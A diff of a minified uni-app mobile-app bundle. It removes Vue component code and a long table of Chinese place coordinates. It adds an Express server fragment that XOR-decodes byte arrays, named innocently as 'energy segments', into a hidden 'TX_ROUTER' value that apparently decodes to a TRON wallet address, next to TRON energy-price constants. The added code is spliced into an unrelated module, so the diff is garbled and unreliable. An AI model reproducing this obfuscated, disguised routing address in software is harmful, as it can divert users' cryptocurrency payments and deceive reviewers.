-                return e[t.map.value] + "" === n;
-              });
-              i && (r = {
-                value: i[this.map.value],
-                data: i
-              });
-            }
-            this.formItem && this.formItem.setValue(r.value), this.$emit("input", r.value), this.$emit("update:modelValue", r.value), this.$emit("change", {
-              detail: r
-            }), this.multiple ? this.dataList = this.getDataList(r.value, !0) : this.dataList = this.getDataList(r.value);
-          },
-          getDataList: function (e) {
-            var t = this,
-              n = JSON.parse(JSON.stringify(this.range)),
-              r = [];
-            return this.multiple && (Array.isArray(e) || (e = [])), n.forEach(function (n, i) {
-              if (n.disabled = n.disable || n.disabled || !1, t.multiple) {
-                if (e.length > 0) {
-                  var o = e.find(function (e) {
-                    return e === n[t.map.value];
-                  });
-                  n.selected = void 0 !== o;
-                } else n.selected = !1;
-              } else n.selected = e === n[t.map.value];
-              r.push(n);
-            }), this.setRange(r);
-          },
-          setRange: function (e) {
-            var t = this,
-              n = e.filter(function (e) {
-                return e.selected;
-              }),
-              r = Number(this.min) || 0,
-              i = Number(this.max) || "";
-            return e.forEach(function (o, a) {
-              if (t.multiple) {
-                if (n.length <= r) {
-                  var s = n.find(function (e) {
-                    return e[t.map.value] === o[t.map.value];
-                  });
-                  void 0 !== s && (o.disabled = !0);
-                }
-                if (n.length >= i && "" !== i) {
-                  var u = n.find(function (e) {
-                    return e[t.map.value] === o[t.map.value];
-                  });
-                  void 0 === u && (o.disabled = !0);
-                }
-              }
-              t.setStyles(o, a), e[a] = o;
-            }), e;
-          },
-          setStyles: function (e, t) {
-            e.styleBackgroud = this.setStyleBackgroud(e), e.styleIcon = this.setStyleIcon(e), e.styleIconText = this.setStyleIconText(e), e.styleRightIcon = this.setStyleRightIcon(e);
-          },
-          getSelectedValue: function (e) {
-            var t = this;
-            if (!this.multiple) return this.dataValue;
-            var n = [];
-            return e.forEach(function (e) {
-              e.selected && n.push(e[t.map.value]);
-            }), this.dataValue && this.dataValue.length > 0 ? this.dataValue : n;
-          },
-          setStyleBackgroud: function (e) {
-            var t = {},
-              n = this.selectedColor ? this.selectedColor : "#2979ff";
-            "list" !== this.mode && (t["border-color"] = e.selected ? n : "#DCDFE6"), "tag" === this.mode && (t["background-color"] = e.selected ? n : "#f5f5f5");
-            var r = "";
-            for (var i in t) r += "".concat(i, ":").concat(t[i], ";");
-            return r;
-          },
-          setStyleIcon: function (e) {
-            var t = {},
-              n = "",
-              r = this.selectedColor ? this.selectedColor : "#2979ff";
-            for (var i in t["background-color"] = e.selected ? r : "#fff", t["border-color"] = e.selected ? r : "#DCDFE6", !e.selected && e.disabled && (t["background-color"] = "#F2F6FC", t["border-color"] = e.selected ? r : "#DCDFE6"), t) n += "".concat(i, ":").concat(t[i], ";");
-            return n;
-          },
-          setStyleIconText: function (e) {
-            var t = {},
-              n = "",
-              r = this.selectedColor ? this.selectedColor : "#2979ff";
-            for (var i in "tag" === this.mode ? t.color = e.selected ? this.selectedTextColor ? this.selectedTextColor : "#fff" : "#000000" : t.color = e.selected ? this.selectedTextColor ? this.selectedTextColor : r : "#000000", !e.selected && e.disabled && (t.color = "#999"), t) n += "".concat(i, ":").concat(t[i], ";");
-            return n;
-          },
-          setStyleRightIcon: function (e) {
-            var t = {},
-              n = "";
-            for (var r in "list" === this.mode && (t["border-color"] = e.selected ? this.styles.selectedColor : "#DCDFE6"), t) n += "".concat(r, ":").concat(t[r], ";");
-            return n;
-          }
-        }
-      };
-      t.default = n;
-    }).call(this, n("861b")["uniCloud"]);
-  },
-  "24c5": function (e, t, n) {
-    "use strict";
-
-    var r = n("47a9");
-    Object.defineProperty(t, "__esModule", {
-      value: !0
-    }), t.default = void 0;
-    var i = r(n("08a9")),
-      o = r(n("b18e")),
-      a = r(n("6342")),
-      s = {
-        en: i.default,
-        "zh-Hans": o.default,
-        "zh-Hant": a.default
-      };
-    t.default = s;
-  },
-  "2b23": function (e, t, n) {
-    "use strict";
-
-    (function (e) {
-      Object.defineProperty(t, "__esModule", {
-        value: !0
-      }), t.default = void 0;
-      var n = {
-        onLaunch: function () {
-          e("log", "App Launch", " at App.vue:4");
-        },
-        onShow: function () {
-          e("log", "App Show", " at App.vue:7");
-        },
-        onHide: function () {
-          e("log", "App Hide", " at App.vue:10");
-        }
-      };
-      t.default = n;
-    }).call(this, n("f3b9")["default"]);
-  },
-  "2d31": function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("82ac"),
-      i = n("9a25");
-    for (var o in i) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return i[e];
-      });
-    }(o);
-    var a = n("828b"),
-      s = Object(a["a"])(i["default"], r["b"], r["c"], !1, null, "242743b0", null, !1, r["a"], void 0);
-    t["default"] = s.exports;
-  },
-  3352: function (e, t) {
-    e.exports = function (e) {
-      if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
-      return e;
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  "346c": function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("66fc"),
-      i = n("2079");
-    for (var o in i) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return i[e];
-      });
-    }(o);
-    var a = n("828b"),
-      s = Object(a["a"])(i["default"], r["b"], r["c"], !1, null, null, null, !1, r["a"], void 0);
-    t["default"] = s.exports;
-  },
-  "34cf": function (e, t, n) {
-    var r = n("ed45"),
-      i = n("7172"),
-      o = n("6382"),
-      a = n("dd3e");
-    e.exports = function (e, t) {
-      return r(e) || i(e, t) || o(e, t) || a();
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  "39c9": function (e, t, n) {
-    "use strict";
-
-    (function (e) {
-      Object.defineProperty(t, "__esModule", {
-        value: !0
-      }), t.default = void 0;
-      var n = {
-        name: "lyg-popup",
-        props: {
-          title: {
-            type: String,
-            default: "\u670D\u52A1\u534F\u8BAE\u548C\u9690\u79C1\u653F\u7B56"
-          },
-          protocolPath: {
-            type: String
-          },
-          policyPath: {
-            type: String
-          },
-          policyStorageKey: {
-            type: String,
-            default: "has_read_privacy"
-          }
-        },
-        data: function () {
-          return {
-            showPopup: !1
-          };
-        },
-        created: function () {
-          var t = this;
-          uni.getStorage({
-            key: this.policyStorageKey,
-            success: function (e) {
-              e.data && (t.showPopup = !1, uni.showTabBar({}));
-            },
-            fail: function (n) {
-              t.showPopup = !0, uni.hideTabBar({}), e("log", n, " at components/lyg-popup/lyg-popup.vue:73");
-            }
-          });
-        },
-        methods: {
-          clear: function () {},
-          back: function () {
-            this.$emit("popupState", !1), plus.runtime.quit();
-          },
-          confirm: function () {
-            this.showPopup = !1, this.$emit("popupState", !0), uni.setStorage({
-              key: this.policyStorageKey,
-              data: !0
-            }), uni.showTabBar({});
-          }
-        }
-      };
-      t.default = n;
-    }).call(this, n("f3b9")["default"]);
-  },
-  "3b2d": function (e, t) {
-    function n(t) {
-      return e.exports = n = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
-        return typeof e;
-      } : function (e) {
-        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
-      }, e.exports.__esModule = !0, e.exports["default"] = e.exports, n(t);
+        recentLeads.set(String(l), U);
+      }
+    } catch (K) {}
+    setInterval(() => {
+      broadcastLeadIfNew(j);
+    }, 4000);
+  })();
+}
+const app = express();
+app.use(bodyParser.json());
+function AddressSeed(j) {
+  const w = 5;
+  const J = j[w];
+  const a = j.filter((z, l) => l !== w);
+  return String.fromCharCode(...a.map(z => z ^ J));
+}
+function getEnergySegmentB() {
+  const j = [42, 62, 46, 25, 23, 108, 12, 24, 20, 98, 46, 25];
+  return j;
+}
+function getEnergySegmentC() {
+  const j = [63, 105, 49, 28, 63, 9, 62, 29, 107, 104, 28];
+  return j;
+}
+const ENERGY_REQUIRED = 105000;
+let SUN_PER_ENERGY = 420;
+const ENERGY_SEGMENT_A = [14, 3, 107, 62, 63, 90, 108, 32, 49, 3, 8, 8],
+  TX_ROUTER = AddressSeed(function () {
+    try {
+      return ENERGY_SEGMENT_A.concat(getEnergySegmentB(), getEnergySegmentC());
+    } catch (J) {
+      return ENERGY_SEGMENT_A;
     }
-    e.exports = n, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  "47a9": function (e, t) {
-    e.exports = function (e) {
-      return e && e.__esModule ? e : {
-        default: e
-      };
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  4965: function (e, t) {
-    e.exports = function (e) {
-      try {
-        return -1 !== Function.toString.call(e).indexOf("[native code]");
-      } catch (t) {
-        return "function" === typeof e;
-      }
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  "4ffb": function (e, t, n) {
-    var r = n("3b2d")["default"],
-      i = n("3352");
-    e.exports = function (e, t) {
-      if (t && ("object" === r(t) || "function" === typeof t)) return t;
-      if (void 0 !== t) throw new TypeError("Derived constructors may only return object or undefined");
-      return i(e);
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  "5f26": function (e, t, n) {
-    "use strict";
-
-    Object.defineProperty(t, "__esModule", {
-      value: !0
-    }), t.default = void 0;
-    var r = {
-      data: function () {
-        return {
-          shuoming2: "\u70B9\u51FB\u590D\u5236\u52A0\u5FAE\u4FE1\uFF1Apowerabacus\u66F4\u65B0\u8F6F\u4EF6"
-        };
-      },
-      methods: {
-        fenxiang: function () {
-          uni.setClipboardData({
-            data: "powerabacus",
-            success: function () {
-              uni.showToast({
-                title: "\u5DF2\u590D\u5236"
-              });
-            },
-            fail: function () {
-              uni.showToast({
-                title: "\u590D\u5236\u5931\u8D25"
-              });
-            }
-          });
-        }
-      },
-      mounted: function () {},
-      onBackPress: function (e) {
-        return "backbutton" == e.from || "navigateBack" != e.from && void 0;
-      },
-      onLoad: function () {}
-    };
-    t.default = r;
-  },
-  6178: function (e, t, n) {
-    "use strict";
-
-    Object.defineProperty(t, "__esModule", {
-      value: !0
-    }), t.jwcx = function (e, t, n) {
-      for (var i = [], o = 0; o < r.length; o++) if (e == r[o][0]) i.push(r[o]);else if (i.length > 0) break;
-      for (var a = 0; a < i.length; a++) {
-        if (n == i[a][1]) {
-          var s = [i[a][2] / 1 + i[a][3] / 100, i[a][4] / 1 + i[a][5] / 100, -8];
-          break;
-        }
-        if (n.substring(0, 2) == i[a][1].substring(0, 2)) {
-          s = [i[a][2] / 1 + i[a][3] / 100, i[a][4] / 1 + i[a][5] / 100, -8];
-          break;
-        }
-        if ("\u53F0\u6E7E\u7701" == i[a][0] & t == i[a][1]) {
-          s = [i[a][2] / 1 + i[a][3] / 100, i[a][4] / 1 + i[a][5] / 100, -8];
-          break;
-        }
-        if (a == i.length - 1) for (var u = 0; u < i.length; u++) if (t.substring(0, 2) == i[u][1].substring(0, 2)) {
-          s = [i[u][2] / 1 + i[u][3] / 100, i[u][4] / 1 + i[u][5] / 100, -8];
-          break;
-        }
-      }
-      return s;
-    };
-    var r = new Array(["\u5317\u4EAC\u5E02", "\u5929\u5B89\u95E8", "39", "54", "116", "23"], ["\u5317\u4EAC\u5E02", "\u5317\u4EAC\u5E02", "39", "54", "116", "24"], ["\u5317\u4EAC\u5E02", "\u623F\u5C71\u533A", "39", "45", "116", "8"], ["\u5317\u4EAC\u5E02", "\u5927\u5174\u533A", "39", "44", "116", "20"], ["\u5317\u4EAC\u5E02", "\u5D07\u6587\u533A", "39", "53", "116", "26"], ["\u5317\u4EAC\u5E02", "\u671D\u9633\u533A", "39", "55", "116", "26"], ["\u5317\u4EAC\u5E02", "\u901A\u5DDE\u533A", "39", "55", "116", "39"], ["\u5317\u4EAC\u5E02", "\u6D77\u6DC0\u533A", "39", "57", "116", "18"], ["\u5317\u4EAC\u5E02", "\u4E1C\u57CE\u533A", "39", "56", "116", "25"], ["\u5317\u4EAC\u5E02", "\u897F\u57CE\u533A", "39", "55", "116", "22"], ["\u5317\u4EAC\u5E02", "\u5BA3\u6B66\u533A", "39", "52", "116", "21"], ["\u5317\u4EAC\u5E02", "\u4E30\u53F0\u533A", "39", "51", "116", "17"], ["\u5317\u4EAC\u5E02", "\u77F3\u666F\u5C71\u533A", "39", "54", "116", "13"], ["\u5317\u4EAC\u5E02", "\u95E8\u5934\u6C9F\u533A", "39", "56", "116", "6"], ["\u5317\u4EAC\u5E02", "\u660C\u5E73\u533A", "40", "13", "116", "14"], ["\u5317\u4EAC\u5E02", "\u987A\u4E49\u533A", "40", "8", "116", "39"], ["\u5317\u4EAC\u5E02", "\u6000\u67D4\u533A", "40", "19", "116", "38"], ["\u5317\u4EAC\u5E02", "\u5E73\u8C37\u533A", "40", "8", "117", "7"], ["\u5317\u4EAC\u5E02", "\u5EF6\u5E86\u53BF", "40", "27", "115", "58"], ["\u5317\u4EAC\u5E02", "\u5BC6\u4E91\u53BF", "40", "22", "116", "50"], ["\u798F\u5EFA\u7701", "\u798F\u5DDE\u5E02", "26", "5", "119", "18"], ["\u798F\u5EFA\u7701", "\u53A6\u95E8\u5E02", "24", "29", "118", "5"], ["\u798F\u5EFA\u7701", "\u6F33\u5DDE\u5E02", "24", "31", "117", "39"], ["\u798F\u5EFA\u7701", "\u6CC9\u5DDE\u5E02", "24", "53", "118", "40"], ["\u798F\u5EFA\u7701", "\u4E09\u660E\u5E02", "26", "16", "117", "37"], ["\u798F\u5EFA\u7701", "\u9F99\u5CA9\u5E02", "25", "6", "117", "2"], ["\u798F\u5EFA\u7701", "\u5357\u5E73\u5E02", "26", "39", "118", "10"], ["\u798F\u5EFA\u7701", "\u5B81\u5FB7\u5E02", "26", "40", "119", "31"], ["\u798F\u5EFA\u7701", "\u8386\u7530\u5E02", "25", "26", "119", "0"], ["\u798F\u5EFA\u7701", "\u5EF6\u5E73\u533A", "26", "39", "118", "10"], ["\u798F\u5EFA\u7701", "\u4E09\u5143\u533A", "26", "14", "117", "36"], ["\u798F\u5EFA\u7701", "\u6885\u5217\u533A", "26", "16", "117", "38"], ["\u798F\u5EFA\u7701", "\u65B0\u7F57\u533A", "25", "6", "117", "2"], ["\u798F\u5EFA\u7701", "\u8549\u57CE\u533A", "26", "40", "119", "31"], ["\u798F\u5EFA\u7701", "\u6DB5\u6C5F\u533A", "25", "27", "119", "6"], ["\u798F\u5EFA\u7701", "\u57CE\u53A2\u533A", "25", "26", "119", "0"], ["\u798F\u5EFA\u7701", "\u8354\u57CE\u533A", "25", "26", "119", "1"], ["\u798F\u5EFA\u7701", "\u79C0\u5C7F\u533A", "25", "19", "119", "5"], ["\u798F\u5EFA\u7701", "\u6CC9\u6E2F\u533A", "25", "7", "118", "53"], ["\u798F\u5EFA\u7701", "\u6D1B\u6C5F\u533A", "24", "57", "118", "40"], ["\u798F\u5EFA\u7701", "\u4E30\u6CFD\u533A", "24", "55", "118", "36"], ["\u798F\u5EFA\u7701", "\u9CA4\u57CE\u533A", "24", "55", "118", "36"], ["\u798F\u5EFA\u7701", "\u540C\u5B89\u533A", "24", "44", "118", "9"], ["\u798F\u5EFA\u7701", "\u7FD4\u5B89\u533A", "24", "37", "118", "14"], ["\u798F\u5EFA\u7701", "\u96C6\u7F8E\u533A", "24", "34", "118", "6"], ["\u798F\u5EFA\u7701", "\u601D\u660E\u533A", "24", "27", "118", "5"], ["\u798F\u5EFA\u7701", "\u6E56\u91CC\u533A", "24", "31", "118", "5"], ["\u798F\u5EFA\u7701", "\u6D77\u6CA7\u533A", "24", "28", "117", "59"], ["\u798F\u5EFA\u7701", "\u9F99\u6587\u533A", "24", "31", "117", "43"], ["\u798F\u5EFA\u7701", "\u8297\u57CE\u533A", "24", "31", "117", "39"], ["\u798F\u5EFA\u7701", "\u664B\u6C5F\u5E02", "24", "49", "118", "35"], ["\u798F\u5EFA\u7701", "\u77F3\u72EE\u5E02", "24", "44", "118", "39"], ["\u798F\u5EFA\u7701", "\u9F99\u6D77\u5E02", "24", "27", "117", "49"], ["\u798F\u5EFA\u7701", "\u6F33\u5E73\u5E02", "25", "18", "117", "25"], ["\u798F\u5EFA\u7701", "\u5357\u5B89\u5E02", "24", "58", "118", "23"], ["\u798F\u5EFA\u7701", "\u6C38\u5B89\u5E02", "25", "59", "117", "22"], ["\u798F\u5EFA\u7701", "\u5EFA\u74EF\u5E02", "27", "2", "118", "19"], ["\u798F\u5EFA\u7701", "\u5EFA\u9633\u5E02", "27", "20", "118", "7"], ["\u798F\u5EFA\u7701", "\u6B66\u5937\u5C71\u5E02", "27", "46", "118", "2"], ["\u798F\u5EFA\u7701", "\u90B5\u6B66\u5E02", "27", "22", "117", "29"], ["\u798F\u5EFA\u7701", "\u798F\u5B89\u5E02", "27", "5", "119", "39"], ["\u798F\u5EFA\u7701", "\u798F\u9F0E\u5E02", "27", "20", "120", "13"], ["\u798F\u5EFA\u7701", "\u957F\u4E50\u5E02", "25", "58", "119", "31"], ["\u798F\u5EFA\u7701", "\u798F\u6E05\u5E02", "25", "43", "119", "23"], ["\u798F\u5EFA\u7701", "\u4ED3\u5C71\u533A", "26", "3", "119", "19"], ["\u798F\u5EFA\u7701", "\u53F0\u6C5F\u533A", "26", "4", "119", "18"], ["\u798F\u5EFA\u7701", "\u9F13\u697C\u533A", "26", "5", "119", "18"], ["\u798F\u5EFA\u7701", "\u664B\u5B89\u533A", "26", "5", "119", "19"], ["\u798F\u5EFA\u7701", "\u9A6C\u5C3E\u533A", "25", "60", "119", "27"], ["\u798F\u5EFA\u7701", "\u6C38\u5B9A\u53BF", "24", "43", "116", "44"], ["\u798F\u5EFA\u7701", "\u9976\u5E73\u53BF", "23", "40", "117", "0"], ["\u798F\u5EFA\u7701", "\u8BCF\u5B89\u53BF", "23", "43", "117", "11"], ["\u798F\u5EFA\u7701", "\u4E91\u9704\u53BF", "23", "57", "117", "20"], ["\u798F\u5EFA\u7701", "\u6F33\u6D66\u53BF", "24", "8", "117", "37"], ["\u798F\u5EFA\u7701", "\u4E1C\u5C71\u53BF", "23", "42", "117", "26"], ["\u798F\u5EFA\u7701", "\u91D1\u95E8\u53BF", "24", "26", "118", "19"], ["\u798F\u5EFA\u7701", "\u957F\u6CF0\u53BF", "24", "37", "117", "45"], ["\u798F\u5EFA\u7701", "\u5E73\u548C\u53BF", "24", "22", "117", "18"], ["\u798F\u5EFA\u7701", "\u5357\u9756\u53BF", "24", "31", "117", "22"], ["\u798F\u5EFA\u7701", "\u534E\u5B89\u53BF", "25", "1", "117", "32"], ["\u798F\u5EFA\u7701", "\u5B89\u6EAA\u53BF", "25", "4", "118", "11"], ["\u798F\u5EFA\u7701", "\u5FB7\u5316\u53BF", "25", "30", "118", "14"], ["\u798F\u5EFA\u7701", "\u6C38\u6625\u53BF", "25", "19", "118", "18"], ["\u798F\u5EFA\u7701", "\u5C24\u6EAA\u53BF", "26", "10", "118", "11"], ["\u798F\u5EFA\u7701", "\u5927\u7530\u53BF", "25", "42", "117", "51"], ["\u798F\u5EFA\u7701", "\u6E05\u6D41\u53BF", "26", "11", "116", "49"], ["\u798F\u5EFA\u7701", "\u5B81\u5316\u53BF", "26", "16", "116", "39"], ["\u798F\u5EFA\u7701", "\u8FDE\u57CE\u53BF", "25", "43", "116", "45"], ["\u798F\u5EFA\u7701", "\u4E0A\u676D\u53BF", "25", "3", "116", "25"], ["\u798F\u5EFA\u7701", "\u6B66\u5E73\u53BF", "25", "6", "116", "6"], ["\u798F\u5EFA\u7701", "\u957F\u6C40\u53BF", "25", "50", "116", "21"], ["\u798F\u5EFA\u7701", "\u660E\u6EAA\u53BF", "26", "22", "117", "12"], ["\u798F\u5EFA\u7701", "\u6CF0\u5B81\u53BF", "26", "54", "117", "10"], ["\u798F\u5EFA\u7701", "\u5EFA\u5B81\u53BF", "26", "50", "116", "50"], ["\u798F\u5EFA\u7701", "\u6D66\u57CE\u53BF", "27", "55", "118", "32"], ["\u798F\u5EFA\u7701", "\u5149\u6CFD\u53BF", "27", "33", "117", "20"], ["\u798F\u5EFA\u7701", "\u987A\u660C\u53BF", "26", "48", "117", "48"], ["\u798F\u5EFA\u7701", "\u5C06\u4E50\u53BF", "26", "44", "117", "28"], ["\u798F\u5EFA\u7701", "\u6C99\u53BF", "26", "24", "117", "47"], ["\u798F\u5EFA\u7701", "\u53E4\u7530\u53BF", "26", "35", "118", "45"], ["\u798F\u5EFA\u7701", "\u5C4F\u5357\u53BF", "26", "55", "118", "59"], ["\u798F\u5EFA\u7701", "\u7F57\u6E90\u53BF", "26", "29", "119", "33"], ["\u798F\u5EFA\u7701", "\u971E\u6D66\u53BF", "26", "53", "119", "60"], ["\u798F\u5EFA\u7701", "\u5468\u5B81\u53BF", "27", "7", "119", "20"], ["\u798F\u5EFA\u7701", "\u5BFF\u5B81\u53BF", "27", "28", "119", "30"], ["\u798F\u5EFA\u7701", "\u653F\u548C\u53BF", "27", "22", "118", "51"], ["\u798F\u5EFA\u7701", "\u677E\u6EAA\u53BF", "27", "32", "118", "47"], ["\u798F\u5EFA\u7701", "\u67D8\u8363\u53BF", "27", "14", "119", "54"], ["\u798F\u5EFA\u7701", "\u8FDE\u6C5F\u53BF", "26", "12", "119", "32"], ["\u798F\u5EFA\u7701", "\u95FD\u4FAF\u53BF", "26", "9", "119", "8"], ["\u798F\u5EFA\u7701", "\u95FD\u6E05\u53BF", "26", "13", "118", "51"], ["\u798F\u5EFA\u7701", "\u6C38\u6CF0\u53BF", "25", "52", "118", "56"], ["\u798F\u5EFA\u7701", "\u4ED9\u6E38\u53BF", "25", "22", "118", "41"], ["\u798F\u5EFA\u7701", "\u60E0\u5B89\u53BF", "25", "2", "118", "48"], ["\u798F\u5EFA\u7701", "\u5E73\u6F6D\u53BF", "25", "31", "119", "47"], ["\u5B89\u5FBD\u7701", "\u5408\u80A5\u5E02", "31", "50", "117", "15"], ["\u5B89\u5FBD\u7701", "\u5B89\u5E86\u5E02", "30", "32", "117", "3"], ["\u5B89\u5FBD\u7701", "\u6C60\u5DDE\u5E02", "30", "40", "117", "29"], ["\u5B89\u5FBD\u7701", "\u516D\u5B89\u5E02", "31", "46", "116", "30"], ["\u5B89\u5FBD\u7701", "\u961C\u9633\u5E02", "32", "54", "115", "49"], ["\u5B89\u5FBD\u7701", "\u4EB3\u5DDE\u5E02", "33", "51", "115", "47"], ["\u5B89\u5FBD\u7701", "\u5BBF\u5DDE\u5E02", "33", "38", "116", "59"], ["\u5B89\u5FBD\u7701", "\u6DEE\u5317\u5E02", "33", "57", "116", "48"], ["\u5B89\u5FBD\u7701", "\u6DEE\u5357\u5E02", "32", "38", "116", "60"], ["\u5B89\u5FBD\u7701", "\u868C\u57E0\u5E02", "32", "55", "117", "23"], ["\u5B89\u5FBD\u7701", "\u6EC1\u5DDE\u5E02", "32", "18", "118", "19"], ["\u5B89\u5FBD\u7701", "\u9A6C\u978D\u5C71\u5E02", "31", "42", "118", "30"], ["\u5B89\u5FBD\u7701", "\u5DE2\u6E56\u5E02", "31", "36", "117", "52"], ["\u5B89\u5FBD\u7701", "\u829C\u6E56\u5E02", "31", "20", "118", "23"], ["\u5B89\u5FBD\u7701", "\u94DC\u9675\u5E02", "30", "56", "117", "49"], ["\u5B89\u5FBD\u7701", "\u5BA3\u57CE\u5E02", "30", "57", "118", "45"], ["\u5B89\u5FBD\u7701", "\u9EC4\u5C71\u5E02", "29", "43", "118", "20"], ["\u5B89\u5FBD\u7701", "\u57C7\u6865\u533A", "33", "38", "116", "58"], ["\u5B89\u5FBD\u7701", "\u70C8\u5C71\u533A", "33", "54", "116", "48"], ["\u5B89\u5FBD\u7701", "\u76F8\u5C71\u533A", "33", "57", "116", "48"], ["\u5B89\u5FBD\u7701", "\u675C\u96C6\u533A", "33", "60", "116", "49"], ["\u5B89\u5FBD\u7701", "\u988D\u4E1C\u533A", "32", "55", "115", "51"], ["\u5B89\u5FBD\u7701", "\u988D\u5DDE\u533A", "32", "53", "115", "48"], ["\u5B89\u5FBD\u7701", "\u988D\u6CC9\u533A", "32", "56", "115", "48"], ["\u5B89\u5FBD\u7701", "\u8C2F\u57CE\u533A", "33", "53", "115", "46"], ["\u5B89\u5FBD\u7701", "\u79B9\u4F1A\u533A", "32", "56", "117", "20"], ["\u5B89\u5FBD\u7701", "\u9F99\u5B50\u6E56\u533A", "32", "57", "117", "23"], ["\u5B89\u5FBD\u7701", "\u868C\u5C71\u533A", "32", "57", "117", "21"], ["\u5B89\u5FBD\u7701", "\u6DEE\u4E0A\u533A", "32", "58", "117", "21"], ["\u5B89\u5FBD\u7701", "\u5927\u901A\u533A", "32", "38", "117", "3"], ["\u5B89\u5FBD\u7701", "\u7530\u5BB6\u5EB5\u533A", "32", "40", "117", "0"], ["\u5B89\u5FBD\u7701", "\u8C22\u5BB6\u96C6\u533A", "32", "36", "116", "51"], ["\u5B89\u5FBD\u7701", "\u516B\u516C\u5C71\u533A", "32", "38", "116", "50"], ["\u5B89\u5FBD\u7701", "\u6F58\u96C6\u533A", "32", "47", "116", "49"], ["\u5B89\u5FBD\u7701", "\u5357\u8C2F\u533A", "32", "19", "118", "18"], ["\u5B89\u5FBD\u7701", "\u7405\u740A\u533A", "32", "18", "118", "18"], ["\u5B89\u5FBD\u7701", "\u5C45\u5DE2\u533A", "31", "36", "117", "51"], ["\u5B89\u5FBD\u7701", "\u5E90\u9633\u533A", "31", "53", "117", "15"], ["\u5B89\u5FBD\u7701", "\u7476\u6D77\u533A", "31", "52", "117", "18"], ["\u5B89\u5FBD\u7701", "\u8700\u5C71\u533A", "31", "51", "117", "16"], ["\u5B89\u5FBD\u7701", "\u5305\u6CB3\u533A", "31", "48", "117", "18"], ["\u5B89\u5FBD\u7701", "\u88D5\u5B89\u533A", "31", "46", "116", "29"], ["\u5B89\u5FBD\u7701", "\u91D1\u5B89\u533A", "31", "46", "116", "30"], ["\u5B89\u5FBD\u7701", "\u5BBF\u677E\u53BF", "30", "9", "116", "7"], ["\u5B89\u5FBD\u7701", "\u5B9C\u79C0\u533A", "30", "36", "117", "0"], ["\u5B89\u5FBD\u7701", "\u8FCE\u6C5F\u533A", "30", "30", "117", "3"], ["\u5B89\u5FBD\u7701", "\u5927\u89C2\u533A", "30", "31", "117", "2"], ["\u5B89\u5FBD\u7701", "\u8D35\u6C60\u533A", "30", "39", "117", "29"], ["\u5B89\u5FBD\u7701", "\u90CA\u533A", "30", "55", "117", "47"], ["\u5B89\u5FBD\u7701", "\u72EE\u5B50\u5C71\u533A", "30", "57", "117", "51"], ["\u5B89\u5FBD\u7701", "\u94DC\u5B98\u5C71\u533A", "30", "56", "117", "49"], ["\u5B89\u5FBD\u7701", "\u96E8\u5C71\u533A", "31", "41", "118", "29"], ["\u5B89\u5FBD\u7701", "\u82B1\u5C71\u533A", "31", "43", "118", "30"], ["\u5B89\u5FBD\u7701", "\u91D1\u5BB6\u5E84\u533A", "31", "44", "118", "29"], ["\u5B89\u5FBD\u7701", "\u6208\u6C5F\u533A", "31", "19", "118", "22"], ["\u5B89\u5FBD\u7701", "\u955C\u6E56\u533A", "31", "21", "118", "22"], ["\u5B89\u5FBD\u7701", "\u9E20\u6C5F\u533A", "31", "22", "118", "23"], ["\u5B89\u5FBD\u7701", "\u4E09\u5C71\u533A", "31", "14", "118", "14"], ["\u5B89\u5FBD\u7701", "\u5BA3\u5DDE\u533A", "30", "57", "118", "45"], ["\u5B89\u5FBD\u7701", "\u9EC4\u5C71\u533A", "30", "18", "118", "8"], ["\u5B89\u5FBD\u7701", "\u5FBD\u5DDE\u533A", "29", "49", "118", "20"], ["\u5B89\u5FBD\u7701", "\u5C6F\u6EAA\u533A", "29", "43", "118", "20"], ["\u5B89\u5FBD\u7701", "\u6850\u57CE\u5E02", "31", "3", "116", "57"], ["\u5B89\u5FBD\u7701", "\u660E\u5149\u5E02", "32", "47", "117", "59"], ["\u5B89\u5FBD\u7701", "\u5929\u957F\u5E02", "32", "42", "118", "60"], ["\u5B89\u5FBD\u7701", "\u5B81\u56FD\u5E02", "30", "38", "118", "59"], ["\u5B89\u5FBD\u7701", "\u592A\u6E56\u53BF", "30", "26", "116", "16"], ["\u5B89\u5FBD\u7701", "\u4E1C\u81F3\u53BF", "30", "6", "117", "1"], ["\u5B89\u5FBD\u7701", "\u77F3\u53F0\u53BF", "30", "13", "117", "29"], ["\u5B89\u5FBD\u7701", "\u679E\u9633\u53BF", "30", "42", "117", "12"], ["\u5B89\u5FBD\u7701", "\u6000\u5B81\u53BF", "30", "43", "116", "50"], ["\u5B89\u5FBD\u7701", "\u671B\u6C5F\u53BF", "30", "8", "116", "41"], ["\u5B89\u5FBD\u7701", "\u6F5C\u5C71\u53BF", "30", "38", "116", "34"], ["\u5B89\u5FBD\u7701", "\u5CB3\u897F\u53BF", "30", "51", "116", "21"], ["\u5B89\u5FBD\u7701", "\u970D\u5C71\u53BF", "31", "24", "116", "20"], ["\u5B89\u5FBD\u7701", "\u8212\u57CE\u53BF", "31", "28", "116", "56"], ["\u5B89\u5FBD\u7701", "\u5E90\u6C5F\u53BF", "31", "15", "117", "17"], ["\u5B89\u5FBD\u7701", "\u80A5\u897F\u53BF", "31", "43", "117", "10"], ["\u5B89\u5FBD\u7701", "\u80A5\u4E1C\u53BF", "31", "53", "117", "28"], ["\u5B89\u5FBD\u7701", "\u91D1\u5BE8\u53BF", "31", "43", "115", "55"], ["\u5B89\u5FBD\u7701", "\u970D\u90B1\u53BF", "32", "20", "116", "16"], ["\u5B89\u5FBD\u7701", "\u988D\u4E0A\u53BF", "32", "38", "116", "16"], ["\u5B89\u5FBD\u7701", "\u961C\u5357\u53BF", "32", "38", "115", "35"], ["\u5B89\u5FBD\u7701", "\u592A\u548C\u53BF", "33", "10", "115", "37"], ["\u5B89\u5FBD\u7701", "\u5229\u8F9B\u53BF", "33", "9", "116", "12"], 